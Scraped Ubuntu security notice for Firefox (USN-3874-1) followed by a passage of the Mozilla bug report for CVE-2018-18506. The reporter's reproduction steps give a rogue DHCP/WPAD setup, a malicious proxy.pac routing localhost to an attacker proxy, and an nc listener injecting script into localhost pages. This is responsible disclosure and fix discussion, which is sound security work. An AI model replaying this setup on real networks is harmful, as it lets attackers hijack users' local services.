=== Content from usn.ubuntu.com_1b014408_20250125_224918.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3874-1: Firefox vulnerabilities

30 January 2019

Firefox could be made to crash or run programs as your login if it
opened a malicious website.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.10](/security/notices?release=cosmic)
* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [firefox](/security/cves?package=firefox) - Mozilla Open Source web browser

## Details

Multiple security issues were discovered in Firefox. If a user were

tricked in to opening a specially crafted website, an attacker could

potentially exploit these to cause a denial of service, gain additional

privileges by escaping the sandbox, or execute arbitrary code.

([CVE-2018-18500](/security/CVE-2018-18500), [CVE-2018-18501](/security/CVE-2018-18501), [CVE-2018-18502](/security/CVE-2018-18502), [CVE-2018-18503](/security/CVE-2018-18503),

[CVE-2018-18504](/security/CVE-2018-18504), [CVE-2018-18505](/security/CVE-2018-18505))

It was discovered that Firefox allowed PAC files to specify that requests

to localhost are sent through the proxy to another server. If proxy

auto-detection is enabled, an attacker could potentially exploit this to

conduct attacks on local services and tools. ([CVE-2018-18506](/security/CVE-2018-18506))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.10

* [firefox](https://launchpad.net/ubuntu/%2Bsource/firefox)
  -
  [65.0+build2-0ubuntu0.18.10.1](https://launchpad.net/ubuntu/%2Bsource/firefox/65.0%2Bbuild2-0ubuntu0.18.10.1)

##### Ubuntu 18.04

* [firefox](https://launchpad.net/ubuntu/%2Bsource/firefox)
  -
  [65.0+build2-0ubuntu0.18.04.1](https://launchpad.net/ubuntu/%2Bsource/firefox/65.0%2Bbuild2-0ubuntu0.18.04.1)

##### Ubuntu 16.04

* [firefox](https://launchpad.net/ubuntu/%2Bsource/firefox)
  -
  [65.0+build2-0ubuntu0.16.04.1](https://launchpad.net/ubuntu/%2Bsource/firefox/65.0%2Bbuild2-0ubuntu0.16.04.1)

##### Ubuntu 14.04

* [firefox](https://launchpad.net/ubuntu/%2Bsource/firefox)
  -
  [65.0+build2-0ubuntu0.14.04.1](https://launchpad.net/ubuntu/%2Bsource/firefox/65.0%2Bbuild2-0ubuntu0.14.04.1)

After a standard system update you need to restart Firefox to make

all the necessary changes.

## References

* [CVE-2018-18500](/security/CVE-2018-18500)
* [CVE-2018-18501](/security/CVE-2018-18501)
* [CVE-2018-18502](/security/CVE-2018-18502)
* [CVE-2018-18503](/security/CVE-2018-18503)
* [CVE-2018-18504](/security/CVE-2018-18504)
* [CVE-2018-18505](/security/CVE-2018-18505)
* [CVE-2018-18506](/security/CVE-2018-18506)

## Related notices

* [USN-3897-1](/security/notices/USN-3897-1)
* [USN-3927-1](/security/notices/USN-3927-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from bugzilla.mozilla.org_a3e40bed_20250126_123405.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1503393)
* [XML](/show_bug.cgi?ctype=xml&id=1503393)

Closed
[Bug 1503393](/show_bug.cgi?id=1503393)
(CVE-2018-18506)

Opened 6 years ago
Closed 6 years ago

# firefox permits proxying localhost via PAC

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

firefox permits proxying localhost via PAC

## Categories

### (Core :: Networking, defect, P1)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Networking#Networking)

Networking
▾

Core :: Networking
For bugs in Mozilla's modular networking library (aka "Netlib" or "Necko".) The networking library supplies the software interface that Mozilla uses to access physical transports (e.g. the Internet and local drives), perform URL resolutions, and handle a variety of networking protocols.

Examples of appropriate bugs: URLs with backslash not fetched; URLs starting with a single slash turn into http:///; Cannot access authenticated FTP site.

[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Networking&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Networking&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Networking)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

63 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla66

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |
| Webcompat Score | --- |
| a11y-review | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox | --- | [66+](/buglist.cgi?f1=cf_tracking_firefox_relnote&o1=equals&v1=66%2B) |
| firefox-esr60 | [66+](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=equals&v1=66%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=fixed) |
| firefox64 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox64&o1=equals&v1=wontfix) |
| firefox65 | [+](/buglist.cgi?f1=cf_tracking_firefox65&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox65&o1=equals&v1=fixed) |
| firefox66 | [+](/buglist.cgi?f1=cf_tracking_firefox66&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox66&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | 66+ |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr60 | 66+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox64 |  | wontfix |
| firefox65 | + | fixed |
| firefox66 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: jannh, Assigned: Gijs)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=40)  [Gijs](/user_profile?user_id=159069)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/0b64d22beb62f067b3ccfc7e0217d946?d=mm&size=40)  [jannh](/user_profile?user_id=597249)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/608e04ebca94be52b05c003d51d43e07?d=mm&size=40)  [kershaw](/user_profile?user_id=505624)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

22 people

## References

### ( [URL](https://bugs.chromium.org/p/project-zero/issues/detail?id=1707 "https://bugs.chromium.org/p/project-zero/issues/detail?id=1707") )

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1524264](/show_bug.cgi?id=1524264 "VERIFIED FIXED - Move \"No Proxy for\" outside the radio button and change the case for design guidelines")

[1507110](/show_bug.cgi?id=1507110 "RESOLVED FIXED - Always no-proxy localhost/127.0.0.1 except if user very explicitly opts out")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=1503393&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1503393)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[bugs.chromium.org/p/project-zero/issu...](https://bugs.chromium.org/p/project-zero/issues/detail?id=1707 "https://bugs.chromium.org/p/project-zero/issues/detail?id=1707")

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[let-localhost-be-localhost](/show_bug.cgi?id=1220810 "RESOLVED FIXED - Consider hardcoding localhost names to the loopback address")

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=899126 "https://bugs.chromium.org/p/chromium/issues/detail?id=899126")

## Details

### (Keywords: sec-moderate, Whiteboard: [necko-triaged][post-critsmash-triage][adv-main65+][adv-esr60.6+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2018-18506

[Keywords:](/describekeywords.cgi)

[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[necko-triaged][post-critsmash-triage][adv-main65+][adv-esr60.6+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (6 files, 5 obsolete files)

| [0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch](/attachment.cgi?id=9021830)  [6 years ago](#c9)  [Daniel Stenberg [:bagder]](/user_profile?user_id=16743)   2.24 KB, patch | mayhemer : [review+](#c14 "6 years ago") | [Details](/attachment.cgi?id=9021830&action=edit) | [Diff](/attachment.cgi?id=9021830&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9021830) |
| --- | --- | --- |
| [the network code patch for this issue](/attachment.cgi?id=9023897)  [6 years ago](#c16)  [Daniel Stenberg [:bagder]](/user_profile?user_id=16743)   2.14 KB, patch | bagder : [review+](#c16 "6 years ago") | [Details](/attachment.cgi?id=9023897&action=edit) | [Diff](/attachment.cgi?id=9023897&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9023897) |
| [verify default localhost skipped from PAC proxying](/attachment.cgi?id=9023960)  [6 years ago](#c19)  [Daniel Stenberg [:bagder]](/user_profile?user_id=16743)   1.78 KB, patch | mayhemer : [review+](#c20 "6 years ago") | [Details](/attachment.cgi?id=9023960&action=edit) | [Diff](/attachment.cgi?id=9023960&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9023960) |
| [Make 'no proxy' field editable](/attachment.cgi?id=9024992)  [6 years ago](#c27)  [:Gijs (he/him)](/user_profile?user_id=159069)   1.22 KB, patch | jaws : [review+](#a1416903_409754 "6 years ago") | [Details](/attachment.cgi?id=9024992&action=edit) | [Diff](/attachment.cgi?id=9024992&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9024992) |
| [0001-bug-1503393-adjust-tests-for-localhost-proxying-r-ma.patch](/attachment.cgi?id=9028261)  [6 years ago](#c37)  [Daniel Stenberg [:bagder]](/user_profile?user_id=16743)   2.43 KB, patch | mayhemer : [review+](#a2659709_269762 "6 years ago") | [Details](/attachment.cgi?id=9028261&action=edit) | [Diff](/attachment.cgi?id=9028261&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9028261) |
| [v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch](/attachment.cgi?id=9029278)  [6 years ago](#c39)  [Daniel Stenberg [:bagder]](/user_profile?user_id=16743)   1.30 KB, patch | bagder : [review+](#c39 "6 years ago")  RyanVM : [approval-mozilla-beta+](#c60 "6 years ago") | [Details](/attachment.cgi?id=9029278&action=edit) | [Diff](/attachment.cgi?id=9029278&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029278) |
| [v2-0002-bug-1503393-verify-default-localhost-not-proxied-.patch](/attachment.cgi?id=9029279)  [6 years ago](#c40)  [Daniel Stenberg [:bagder]](/user_profile?user_id=16743)   1.80 KB, patch | bagder : [review+](#c40 "6 years ago")  RyanVM : [approval-mozilla-beta+](#a4318774_75935 "6 years ago") | [Details](/attachment.cgi?id=9029279&action=edit) | [Diff](/attachment.cgi?id=9029279&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029279) |
| [v2-0003-Bug-1503393-Make-no-proxy-field-editable-r-jaws.patch](/attachment.cgi?id=9029280)  [6 years ago](#c41)  [Daniel Stenberg [:bagder]](/user_profile?user_id=16743)   1.25 KB, patch | bagder : [review+](#c41 "6 years ago")  RyanVM : [approval-mozilla-beta+](#a4318780_75935 "6 years ago") | [Details](/attachment.cgi?id=9029280&action=edit) | [Diff](/attachment.cgi?id=9029280&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029280) |
| [v2-0004-bug-1503393-adjust-tests-for-localhost-proxying-r.patch](/attachment.cgi?id=9029281)  [6 years ago](#c42)  [Daniel Stenberg [:bagder]](/user_profile?user_id=16743)   2.44 KB, patch | bagder : [review+](#c42 "6 years ago")  RyanVM : [approval-mozilla-beta+](#a4318785_75935 "6 years ago") | [Details](/attachment.cgi?id=9029281&action=edit) | [Diff](/attachment.cgi?id=9029281&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029281) |
| [patch3\_for\_esr60](/attachment.cgi?id=9046859)  [6 years ago](#c69)  [Junior [inactive]](/user_profile?user_id=611900)   4.21 KB, patch |  | [Details](/attachment.cgi?id=9046859&action=edit) | [Diff](/attachment.cgi?id=9046859&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9046859) |
| [patch4\_for\_esr60](/attachment.cgi?id=9046861)  [6 years ago](#c70)  [Junior [inactive]](/user_profile?user_id=611900)   8.57 KB, patch | RyanVM : [approval-mozilla-esr60+](#c73 "6 years ago") | [Details](/attachment.cgi?id=9046861&action=edit) | [Diff](/attachment.cgi?id=9046861&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9046861) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Jann Horn](/user_profile?user_id=597249)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1503393#c0)• 6 years ago |
|  | |

User Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Steps to reproduce:
- install Firefox 63.0 in a Windows 10 VM, on a Linux host
- ensure that the network interface is connected to an empty host bridge and that the VM software does not act as a DHCP server
- configure a DHCP server on the host to send DHCP replies that point to a WPAD server, like this:
option wpad-url code 252 = text;
subnet 192.168.250.0 netmask 255.255.255.0 {
range 192.168.250.100 192.168.250.200;
option routers 192.168.250.1;
option wpad-url "<http://192.168.250.1:8080/proxy.pac>";
}
- run an HTTP server on the host, port 8080 (e.g. "python -m SimpleHTTPServer 8080"), serving a "proxy.pac" file with the following content:
function FindProxyForURL(url, host) {
if (dnsDomainIs(host, "localhost") || isInNet(dnsResolve(host), "127.0.0.0", "255.0.0.0")) {
return "PROXY 192.168.250.1:8081";
} else {
return "DIRECT";
}
}
- run `echo '<script>alert("hello from "+document.location)</script>' | nc -Nvlp 8081` on the host
- in the guest, in Firefox, open about:preferences; under General > Network Settings, click "Settings"
- tick "Auto-detect proxy settings for this network"
- click "OK"
- close Firefox in the guest
- disable and re-enable the guest's network interface (via Control Panel > Network and Internet > Network Connections)
- open Firefox on the guest
- navigate to <http://localhost/>
Thanks to eroman@ from Chrome Security for pointing out that this affects Firefox if the user has enabled proxy auto-detection.
Actual results:
Firefox connects to the proxy provided by the PAC script, and the JS code `alert("hello from "+document.location)` runs in the context of <http://localhost/>.
Expected results:
localhost should be special. There are applications that bind a web server to localhost and then use "Host" header checks to prevent DNS rebinding attacks. Such applications need to be protected from malicious outside traffic even if the network is malicious. Currently, Firefox does not special-case localhost in proxying decisions; this means that an attacker can abuse WPAD to gain the ability to serve attacker-controlled content at [http://localhost:\*/](http://localhost:*/)\* , at which point the attacker should be able to perform same-origin XHR to [http://localhost:\*/](http://localhost:*/)\* (e.g. by letting the PAC file specify "DIRECT" as fallback if the proxy goes down).

|  | [Johann Hofmann [:johannh]](/user_profile?user_id=522029) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a2692_522029)• 6 years ago |

Group: firefox-core-security → core-securityComponent: Untriaged → NetworkingProduct: Firefox → Core

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a3455_159069)• 6 years ago |

Group: core-security → network-core-security

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1503393#c1)• 6 years ago |
|  | |

Honza, do you know who might be able to look at this? Thanks.Status: UNCONFIRMED → NEWEver confirmed: trueFlags: needinfo?(honzab.moz)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1503393#c2)• 6 years ago |
|  | |

Jann, is there a need to use network-discovery of proxy settings for this to be a bug?
(I do understand that there's a different threat model for network-supplied proxy configuration)
It should be easier to test and reproduce when supplying a .pac file in the proxy settings directly.Flags: needinfo?(jannh)

|  | [Dragana Damjanovic [:dragana]](/user_profile?user_id=508195) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1503393#c3)• 6 years ago |
|  | |

Daniel, can you take a look? You looked into proxy stuff recently.Flags: needinfo?(honzab.moz) → needinfo?(daniel)

|  | [Honza Bambas (:mayhemer)](/user_profile?user_id=269762) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1503393#c4)• 6 years ago |
|  | |

When you are configuring the proxy manually, there is a field "No Proxy for" that is by default prefilled with "localhost,127.0.0.1". If you have not modified that preference, then we are apparently not respecting it for other than manual proxy configuration. Maybe that should change in Necko and then in the UI?

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1503393#c5)• 6 years ago |
|  | |

That pref appears to only be used if DIRECT or MANUAL proxyconfig...
<https://searchfox.org/mozilla-central/source/netwerk/base/nsProtocolProxyService.cpp#2295>
But as :freddyb says, this looks like it works the same for PACs no matter how it gets to Firefox.Flags: needinfo?(daniel)

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1503393#c6)• 6 years ago |
|  | |

(where's my edit button?)
Sorry, only if MANUAL proxy is configured. Ie not for "PAC" nor "WPAD".

|  | [Honza Bambas (:mayhemer)](/user_profile?user_id=269762) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1503393#c7)• 6 years ago |
|  | |

Does this has to be a security hidden bug?

|  | [Jann Horn](/user_profile?user_id=597249)  Reporter |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1503393#c8)• 6 years ago |
|  | |

Re #2: I tested it, and I can reproduce the same behavior when a PAC URL has been manually configured. I believe that this is still, to some degree, a security problem if a PAC URL has been manually configured, but I believe that there is more obvious security impact if this is triggered by WPAD.
Re #4: My suggestion would be to also inhibit this behavior for a few other names. Looking around for software that attempts to protect itself against DNS rebinding:
CUPS uses the following code to verify the Host header (<https://github.com/apple/cups/blob/master/scheduler/client.c#L3565-L3576>); so all of the following host names should probably be excluded from (PAC-based) proxying:
return (!\_cups\_strcasecmp(con->clientname, "localhost") ||
!\_cups\_strcasecmp(con->clientname, "localhost.") ||
!strcmp(con->clientname, "127.0.0.1") ||
!strcmp(con->clientname, "[::1]"));
The devtools http handler of Chrome has a whitelisting function here: <https://cs.chromium.org/chromium/src/content/browser/devtools/devtools_http_handler.cc?l=106&gsn=RequestIsSafeToServe>
which whitelists localhost6, localhost6.localdomain6, localhost, localhost.localdomain, \*.localhost, and variations of that with a dot at the end.Flags: needinfo?(jannh)

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a136846_16743)• 6 years ago |

See Also: → [let-localhost-be-localhost](/show_bug.cgi?id=1220810 "RESOLVED FIXED - Consider hardcoding localhost names to the loopback address")

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1503393#c9)• 6 years ago |
|  | |

Attached patch

[0001-bug-1503393-don-t-proxy-localhost-whatever-proxy-tha.patch](attachment.cgi?id=9021830&action=diff) (obsolete)
— [Details](attachment.cgi?id=9021830&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9021830)

Maybe prevent localhost from getting proxied whatever proxy method that's used similar to this patch?
We could also consider to extend the default pref value.Assignee: nobody → daniel

|  | [Alex Gaynor [:Alex\_Gaynor]](/user_profile?user_id=537703) |  |
| --- | --- | --- |
